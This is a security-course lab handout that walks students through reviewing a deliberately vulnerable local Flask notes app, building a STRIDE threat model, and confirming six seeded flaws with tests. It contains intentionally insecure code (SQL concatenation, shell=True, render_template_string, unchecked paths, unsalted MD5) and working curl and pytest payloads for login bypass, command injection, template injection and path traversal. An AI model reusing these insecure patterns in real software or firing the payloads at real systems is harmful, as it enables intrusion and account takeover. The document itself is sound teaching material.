---
title: "LAB-307-01 · Threat Model and Code Review"
description: "Review a seeded Flask application by inspection, derive a STRIDE table, then confirm every finding with a minimal test."
module_code: CYB-307
level: 3
kind: lab
prerequisites: [CYB-307]
estimated_minutes: 120
difficulty: advanced
safety: local-only
lab_ids: [LAB-307-01]
version: 1.0.0
last_reviewed: 2026-10-29
reviewers: []
status: published
tags: [threat-modeling, code-review, stride, taint-analysis]
---

# LAB-307-01 · Threat Model and Code Review

## Scenario and background

You have been asked to review a small internal application before it is deployed. There is no scanner output, no
prior report, and no time to read every line. This is the normal condition of a code review, and the discipline is
the same every time: draw the boundaries, apply STRIDE, then follow data from source to sink.

The application below is deliberately flawed, with six distinct vulnerability classes. Your review must find them
**by reading**, cite each by file and line, and then confirm each with a test — because a review finding you cannot
demonstrate is a hypothesis, and hypotheses do not go in reports.

## Learning objectives

By the end of this lab you can:

1. Draw a data-flow diagram with trust boundaries for a small application.
2. Derive STRIDE threats per boundary and express each as a control plus a test.
3. Identify injection, authorization, path handling, template and storage flaws by inspection.
4. Cite findings by file and line with a stated consequence.
5. Confirm each review finding with a minimal reproducible test.

## Required tools and versions

| Tool | Version | Notes |
| --- | --- | --- |
| Python 3 + Flask | 3.10+, Flask 3.x | Runs the sample |
| `pytest` | 7.x | Confirmation tests |
| `curl` | 7.81+ | Manual confirmation |
| `nl`, `grep` | standard | Line citations |

!!! warning "Authorized scope — read before you begin"
    **Targets you may use:** the sample application running on `http://127.0.0.1:5070` on your own machine.
    **Targets you must not use:** any network service, and do not expose this application beyond loopback. It has
    a command-injection flaw; binding it to `0.0.0.0` would hand remote code execution to your whole network.

    **Command injection payloads are limited to `id`, `whoami`, and `echo`.** No reverse shells, no downloads, no
    data exfiltration. The finding is proven by the output of `id`; anything more is out of scope.

    Full rules: [Safety Policy](../../../policies/safety-policy.md).

## Threat model of the exercise

You are the reviewer. The adversary is an authenticated low-privilege user, plus an unauthenticated visitor for
the routes that do not require login. The data is synthetic: three users, four notes, no real personal data.

## Environment

| Component | Detail |
| --- | --- |
| Application | `notesapp.py`, Flask, SQLite |
| Address | `127.0.0.1:5070` |
| Data | Seeded: `alice`, `bob`, `carol`; notes owned by each |
| Files | `files/` containing two synthetic text files |

## Before you start

```bash
mkdir -p ~/lab/level-3/lab-307-01/{app/app/files,evidence}
cd ~/lab/level-3/lab-307-01/app
```

Create `notesapp.py` exactly as given. Read it once before running it — the review begins with reading, not with
execution.

```python
"""Seeded application for LAB-307-01. Deliberately vulnerable. Lab use only."""
import hashlib, os, sqlite3, subprocess
from flask import Flask, request, jsonify, render_template_string, g, session

app = Flask(__name__)
app.secret_key = "lab-secret-307"
DB = os.path.join(os.path.dirname(__file__), "notes.db")


def db():
    if "db" not in g:
        g.db = sqlite3.connect(DB)
    return g.db


def md5(text: str) -> str:
    return hashlib.md5(text.encode()).hexdigest()


@app.post("/register")
def register():
    user = request.form["user"]
    password = request.form["pass"]
    db().execute(f"INSERT INTO users VALUES ('{user}', '{md5(password)}')")
    db().commit()
    return "registered"


@app.post("/login")
def login():
    user = request.form["user"]
    password = request.form["pass"]
    row = db().execute(
        f"SELECT user FROM users WHERE user = '{user}' AND pass = '{md5(password)}'"
    ).fetchone()
    if row:
        session["user"] = row[0]
        return "logged in"
    return "denied", 401


@app.get("/notes/<int:note_id>")
def get_note(note_id):
    row = db().execute(
        "SELECT id, owner, body FROM notes WHERE id = ?", (note_id,)
    ).fetchone()
    return jsonify(row)


@app.get("/lookup")
def lookup():
    host = request.args.get("host", "")
    output = subprocess.check_output(f"getent hosts {host}", shell=True)
    return output


@app.get("/render")
def render():
    template = request.args.get("t", "hello")
    return render_template_string(template)


@app.get("/file")
def read_file():
    name = request.args.get("name", "")
    with open(os.path.join(os.path.dirname(__file__), "files", name)) as fh:
        return fh.read()


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5070, debug=True)
```

Seed the database and files:

```bash
python3 - <<'PY'
import sqlite3, hashlib
conn = sqlite3.connect("notes.db")
conn.executescript("""
DROP TABLE IF EXISTS users; DROP TABLE IF EXISTS notes;
CREATE TABLE users (user TEXT, pass TEXT);
CREATE TABLE notes (id INTEGER PRIMARY KEY, owner TEXT, body TEXT);
""")
for u in ("alice", "bob", "carol"):
    conn.execute("INSERT INTO users VALUES (?,?)", (u, hashlib.md5(b"Lab-Passw0rd-307").hexdigest()))
conn.executemany("INSERT INTO notes (owner, body) VALUES (?,?)", [
    ("alice", "alice note one (synthetic)"),
    ("alice", "alice note two (synthetic)"),
    ("bob",   "bob note one (synthetic)"),
    ("carol", "carol note one (synthetic)"),
])
conn.commit(); conn.close()
print("seeded")
PY

printf 'synthetic file A\n' > files/a.txt
printf 'synthetic file B\n' > files/b.txt

python3 -m venv .venv && . .venv/bin/activate
pip install flask pytest
python notesapp.py &
sleep 2
curl -sS -o /dev/null -w 'up=%{http_code}\n' http://127.0.0.1:5070/render
```

**Expected:** `up=200`.

## Procedure

### 1. Establish the line map

Citations must be exact, so start with numbered source:

```bash
nl -ba notesapp.py > ../evidence/notesapp-numbered.txt
grep -nE 'execute|subprocess|open\(|render_template_string|secret_key|debug' notesapp.py
```

**Expected:** roughly seven interesting lines. This grep is a review aid, not the review — it points at sinks, and
your job is to trace what reaches them.

### 2. Draw the data-flow diagram

In `evidence/dfd.md`, draw the four elements and mark boundaries. Minimum content:

```text
[Browser/curl]──(1)──▶│ [Flask app] ──(2)──▶ [(SQLite)]
                      │      │
   boundary ──────────┘      └──(3)──▶ [filesystem]
                      │      └──(4)──▶ [/bin/sh]
                      └──(5)──▶ [template engine]
```

**Boundary crossings to mark:** (1) all HTTP input, including form fields and query strings; (2) SQL text built in
the app; (3) paths built in the app; (4) strings passed to a shell; (5) user-controlled template source.

### 3. Apply STRIDE

Complete a table with at least one row per boundary. Two rows are given as the pattern; the rest are yours.

| # | Boundary | Threat | Control | Test |
| --- | --- | --- | --- | --- |
| 1 | Browser → app | S: session forgery via a known `secret_key` | Random per-deployment key from config | Sign a cookie with the published key; expect rejection |
| 4 | App → shell | E: command injection through `host` | Argument list, no `shell=True` | Send `127.0.0.1; id`; expect no `uid=` in output |
| … | … | … | … | … |

### 4. Produce the findings table

For each finding: id, title, file:line, class (from the CYB-302/303/304 vocabulary), precondition, consequence,
and your severity with a one-sentence rationale. Do not run anything yet — this is the inspection pass, and its
value is that it can be done on code you cannot execute.

Worked example of the expected level of specificity:

| ID | Finding | Location | Class | Consequence |
| --- | --- | --- | --- | --- |
| F-01 | User input concatenated into SQL in registration and login | `notesapp.py:27`, `:38` | SQL injection | Authentication bypass and data modification |
| F-02 | … | … | … | … |

**Six findings are seeded.** If you have four, look again at the file and template handling. If you have ten, check
which are duplicates of the same root cause — a good review consolidates, it does not inflate.

### 5. Confirm each finding with a test

Now run the application and prove each one. Keep every proof minimal and harmless.

```bash
B='http://127.0.0.1:5070'
curl -sS -o /dev/null -w 'base=%{http_code}\n' "$B/render?t=hello"

# Template injection: does the expression evaluate?
curl -sS -G "$B/render" --data-urlencode 't={{7*7}}'; echo

# Command injection: does a second command run?
curl -sS -G "$B/lookup" --data-urlencode 'host=127.0.0.1; id'; echo

# Path traversal: read a file outside the intended directory
curl -sS -G "$B/file" --data-urlencode 'name=../notesapp.py' | head -3

# Missing authorization: read notes belonging to other users
for n in 1 2 3 4; do curl -sS "$B/notes/$n"; echo; done
```

**Expected:** `49` from the template, `uid=…` from the shell, source code from the traversal, and notes owned by
three different users — none of which required authentication.

Then the two that need a login:

```bash
# Authentication bypass through SQL injection in the login form
curl -sS -o /dev/null -w 'bypass=%{http_code}\n' -X POST "$B/login" \
  --data-urlencode "user=alice' OR '1'='1' -- " --data-urlencode 'pass=wrong'

# Hash storage: is the stored value an unsalted MD5?
python3 -c "import hashlib;print(hashlib.md5(b'Lab-Passw0rd-307').hexdigest())"
sqlite3 notes.db 'SELECT user, pass FROM users LIMIT 2;' 2>/dev/null || \
  python3 -c "import sqlite3;print(sqlite3.connect('notes.db').execute('SELECT user,pass FROM users LIMIT 2').fetchall())"
```

**Expected:** the bypass returns `200` for a wrong password, and the stored hashes match the MD5 of a known
password. That is authentication bypass and inadequate password storage, confirmed without cracking anything.

Now convert the confirmations into `pytest` tests so the review is reproducible:

```bash
cat > tests.py <<'PY'
"""Confirmation tests: each asserts that a seeded flaw is present."""
import re, pytest, requests

B = "http://127.0.0.1:5070"

def test_template_injection_evaluates():
    r = requests.get(f"{B}/render", params={"t": "{{7*7}}"}, timeout=5)
    assert "49" in r.text

def test_command_injection_runs_second_command():
    r = requests.get(f"{B}/lookup", params={"host": "127.0.0.1; id"}, timeout=5)
    assert re.search(r"uid=\d+", r.text)

def test_path_traversal_reads_source():
    r = requests.get(f"{B}/file", params={"name": "../notesapp.py"}, timeout=5)
    assert "app.secret_key" in r.text

def test_notes_readable_without_authentication():
    owners = set()
    for n in range(1, 5):
        r = requests.get(f"{B}/notes/{n}", timeout=5)
        if r.status_code == 200 and isinstance(r.json(), list):
            owners.add(r.json()[1])
    assert len(owners) > 1

def test_login_sql_injection_bypasses_password():
    r = requests.post(f"{B}/login",
                      data={"user": "alice' OR '1'='1' -- ", "pass": "wrong"}, timeout=5)
    assert r.status_code == 200
PY
python -m pytest tests.py -q
```

**Expected:** five passing tests. Each one asserts the *presence* of a flaw, so these are temporary artefacts. In
LAB-307-03 you invert every one of them into a test that asserts the flaw is gone.

### 6. Rate and prioritise

Add a severity column and a rationale to the findings table. Use impact × likelihood, state the precondition
(authenticated? network position?), and order the table by what you would fix first. Then answer in one paragraph:
if only one finding could be fixed before deployment, which, and why.

## Evidence to collect

- `evidence/notesapp-numbered.txt` — the line map.
- `evidence/dfd.md` — diagram and boundary list.
- `evidence/stride.md` — the STRIDE table with controls and tests.
- `evidence/findings.md` — six findings with location, class, precondition, consequence, severity.
- `tests.py` and `evidence/pytest-review.txt` — five passing confirmation tests.
- `evidence/curl-confirmations.txt` — the raw commands and outputs.

## Verification

- [ ] Every finding cites a file and line from the numbered source.
- [ ] The DFD marks all five boundary crossings.
- [ ] STRIDE table has at least six rows, each with a control and a test.
- [ ] All six seeded flaws are identified **before** running the confirmation commands.
- [ ] Five confirmation tests pass, and each corresponds to a row in the findings table.
- [ ] Each finding has a precondition and a severity rationale.
- [ ] No command beyond `id`/`whoami`/`echo` was injected.

## Teardown and reset

```bash
pkill -f notesapp.py
deactivate 2>/dev/null
```

The application is local and disposable; revert the directory if you want a clean start for LAB-307-03. Keep
`evidence/` — the findings table is the input to the repair lab.

## Reflection

1. You found the flaws by reading before running anything. Name one flaw class that would be much harder to find
   by execution alone, and why.
2. `notesapp.py` uses a parameterised query in `get_note` and concatenation in `login`. What does that tell you about
   reviewing for consistency, and what would you check next?
3. The `secret_key` is hardcoded. Explain the attack that becomes possible and why "nobody knows the source" is not
   a control.
4. Which single finding would you fix first, and which would you accept with a compensating control? Defend both.

## Rubric

| Criterion | 1 — Incomplete | 3 — Competent | 5 — Proficient |
| --- | --- | --- | --- |
| Coverage | Fewer than four flaws | All six found | All six found by inspection, with duplicates consolidated |
| Citations | Vague locations | File and line given | File and line plus the data path that reaches the sink |
| Threat model | Diagram only | Diagram plus STRIDE | STRIDE with a control and a test per row, including a boundary most reviews miss |
| Confirmation | Manual only | Commands demonstrate the flaws | Tests reproduce every finding, ready to be inverted |

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| `{{7*7}}` returns literally | Jinja autoescape or the parameter was not decoded | Use `-G --data-urlencode`; confirm with `t=hello` |
| `getent` not found in the container | Minimal image | `apt install libc-bin`, or use `host` and adjust the payload |
| `sqlite3` CLI missing | Package absent | Use the Python one-liner variant |
| Notes request returns `null` | Seeded ids differ | `SELECT id, owner FROM notes;` and adjust |
| Login bypass returns `401` | Payload's trailing comment needs a space | Keep the space in `-- ` |
| `pytest` cannot connect | App not running | Start `notesapp.py` in the background and confirm `/render` |

## References

1. OWASP Threat Modeling Cheat Sheet. Accessed 2026-10-29.
2. OWASP Code Review Guide v2.0 — reviewing for injection and authorization. Accessed 2026-10-29.
3. OWASP Top 10:2025 — A05 Injection, A01 Broken Access Control, A07 Authentication Failures.
   <https://owasp.org/Top10/2025/>
4. OWASP ASVS 5.0 — V1, V8, V15. <https://asvs.owasp.org/>
